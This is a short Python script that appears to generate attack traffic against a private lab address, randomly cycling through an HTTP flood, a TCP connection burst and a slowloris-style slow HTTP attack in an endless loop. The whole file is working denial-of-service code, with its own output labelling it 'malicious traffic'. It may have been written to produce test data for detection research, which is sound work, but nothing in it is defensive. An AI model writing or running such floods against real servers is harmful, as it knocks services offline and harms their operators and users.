#!/usr/bin/env python3
import subprocess
import random
import time
import sys
import socket

TARGET = "10.0.1.2"

def run_http_flood(duration=10):
    print(f"\n[ATTACK] HTTP flood ({duration}s)...")
    end = time.time() + duration

    while time.time() < end:
        subprocess.run(
            ["curl", "-s", f"http://{TARGET}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

def run_tcp_stress(duration=10):
    print(f"\n[ATTACK] TCP connection burst ({duration}s)...")
    end = time.time() + duration

    while time.time() < end:
        try:
            s = socket.socket()
            s.settimeout(1)
            s.connect((TARGET, 80))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            s.recv(1024)
            s.close()
        except:
            pass

def run_slow_http(duration=10):
    print(f"\n[ATTACK] Slow HTTP (slowloris-style)...")
    sockets = []
    end = time.time() + duration

    while time.time() < end:
        try:
            s = socket.socket()
            s.connect((TARGET, 80))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
            sockets.append(s)
        except:
            pass

        time.sleep(0.2)

    for s in sockets:
        s.close()

def main():
    print(f"[+] Starting improved malicious traffic against {TARGET}")

    attacks = [run_http_flood, run_tcp_stress, run_slow_http]

    try:
        while True:
            attack = random.choice(attacks)
            attack()

            pause = random.randint(3, 8)
            print(f"\n[+] Cooling down {pause}s...\n")
            time.sleep(pause)

    except KeyboardInterrupt:
        print("\n[-] Stopped.")
        sys.exit(0)

if __name__ == "__main__":
    main()